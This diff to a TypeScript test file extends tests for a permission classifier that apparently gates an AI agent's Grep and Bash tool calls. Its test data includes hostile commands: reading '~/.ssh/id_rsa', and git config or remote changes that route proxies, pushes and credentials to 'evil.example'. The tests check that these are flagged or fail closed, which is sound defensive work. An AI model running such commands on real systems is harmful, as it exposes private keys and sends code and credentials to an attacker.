@@ -12,7 +12,12 @@ vi.mock('../../../src/host/services/infra/logger', () => ({
   }),
 }));
 
-import { classifyPermission, getPermissionClassifier, PermissionClassifier } from '../../../src/host/tools/permissionClassifier';
+import {
+  bashCommandRequiresPermission,
+  classifyPermission,
+  getPermissionClassifier,
+  PermissionClassifier,
+} from '../../../src/host/tools/permissionClassifier';
 import { setCommandPolicyRulesForTest } from '../../../src/host/tools/modules/shell/commandPolicy';
 
 describe('PermissionClassifier', () => {
@@ -519,6 +524,16 @@ describe('PermissionClassifier', () => {
         { file_path: '.env' },
         { ...context, permissionLevel: 'read' },
       );
+      const grepPatternOnly = await classifyPermission(
+        'Grep',
+        { pattern: '.env' },
+        { ...context, permissionLevel: 'read' },
+      );
+      const grepSensitivePath = await classifyPermission(
+        'Grep',
+        { pattern: 'SECRET', path: '.env' },
+        { ...context, permissionLevel: 'read' },
+      );
       const quotedHomeSecret = await classifyPermission(
         'Bash',
         { command: 'cat "$HOME/.ssh/id_rsa"' },
@@ -539,6 +554,8 @@ describe('PermissionClassifier', () => {
       });
       expect(readme.decision).toBe('approve');
       expect(projectReadSecret.decision).toBe('ask');
+      expect(grepPatternOnly.decision).toBe('approve');
+      expect(grepSensitivePath.decision).toBe('ask');
       expect(quotedHomeSecret).toMatchObject({
         decision: 'ask',
         traceStep: { rule: 'B1: sensitive_credential_read' },
@@ -556,6 +573,8 @@ describe('PermissionClassifier', () => {
         'git config http.proxy http://evil.example',
         'git config --file .git/config credential.helper store',
         'git config -f .git/config url.https://evil.example/.insteadOf https://github.com/',
+        'git config --global url.https://evil.example/.pushInsteadOf ssh://git@github.com/',
+        'git config https.proxy http://evil.example',
         'env git remote set-url origin https://evil.example/x.git',
         'command git remote set-url origin https://evil.example/x.git',
         'command -- git config credential.helper store',
@@ -621,6 +640,14 @@ describe('PermissionClassifier', () => {
         traceStep: { rule: 'B1: git_remote_or_credential_write' },
       });
       expect(dryRun.decision).toBe('approve');
+    });
+
+    it.each([
+      'cat ~/.ssh/id_rsa;',
+      '(cat ~/.ssh/id_rsa)',
+      'git remote set-url origin https://evil.example/x.git;',
+    ])('fails closed when compound command segmentation cannot preserve %s', (command) => {
+      expect(bashCommandRequiresPermission(command, context)).toBe(true);
     });
   });
 });
